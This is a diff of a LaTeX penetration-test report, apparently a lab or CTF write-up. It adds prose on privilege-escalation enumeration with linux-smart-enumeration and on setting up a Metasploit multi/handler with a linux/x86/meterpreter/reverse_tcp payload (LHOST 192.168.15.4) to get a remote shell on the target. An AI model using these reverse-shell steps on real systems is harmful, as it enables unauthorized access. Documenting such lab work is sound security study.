@@ -333,7 +333,8 @@ If you want to escalate your privileges on Linux, you have five options, which a
 	\item Find an attachable process that is running as root.
 \end{enumerate}
 
-\subsubsection{smart enumeration}
+\subsubsection{Using a smart enumeration tool}
+To quickly and efforlessly information about possible attack vecotors for a priveldege escalation there are tools such as \texttt{linux-smart-enumeration} to do the job for you after running the script on both users that there were no attack vecotrs which we could exploit we out that there was a empty backup file in the following location {/snap/docker/2963/usr/share/man/man8/zstreamdump.8.gz} and that there is a \texttt{screen} session by the root user which we cannot attach to  and lastly that the binarys \texttt{/snap/snapd/23545/usr/lib/snapd/snap-confine} and \texttt{/snap/snapd/23258/usr/lib/snapd/snap-confine} run as root but there is only a cive for it which is alr patched for years.
 \subsubsection{trying a kernel level exploit}
 \subsubsection{checking suid binarys}
 \subsubsection{checking root proccses}
@@ -360,7 +361,24 @@ After this, the payload is uploaded to the target using scp, as demonstrated in 
 	\centering
 	\caption{Uploading the payload to the target}
 \end{figure}\abc
-The next stop is to open the metasploit console by running \texttt{msfconsole}, setting the exploit to be \texttt{exploiut/multi/handler}
+\newpage\abc
+The next step is to open the Metasploit console by running \texttt{msfconsole}. Set the exploit to \texttt{exploit/multi/handler}, the payload to \texttt{linux/x86/meterpreter/reverse\_tcp}, the LHOST to \texttt{192.168.15.4}, and finally, run the command \texttt{run} to start the reverse TCP handler. After that, we execute the binary on the target, and we have a Meterpreter shell, as shown in Figures 30 and 31.
+\begin{figure}[ht]
+	\includegraphics[scale=0.5]{images/msfc.png}
+	\centering
+	\caption{Running the necessary commands in the msfconsole}
+\end{figure}
+\begin{figure}[h]
+	\includegraphics[scale=0.8]{images/ep.png}
+	\centering
+	\caption{Executing the payload on the target}
+\end{figure}\abc
+Now that we have access to Meterpreter, we can use commands such as \texttt{getuid} to get the ID of the user and many other useful commands such as \texttt{upload} and \texttt{download}. However, as demonstrated in Figure 32, loading the priv module didn't work, so we were not able to test if \texttt{getsystem} would work to escalate the privileges.
+\begin{figure}[h]
+	\includegraphics[scale=0.51]{images/RadagJuice.png}
+	\centering
+	\caption{The required modules not being loaded}
+\end{figure}\abc
 \newpage
 \subsubsection{trying other common ctf priv escalation ways}
 \subsection{reseting the root password and exploring the vm}
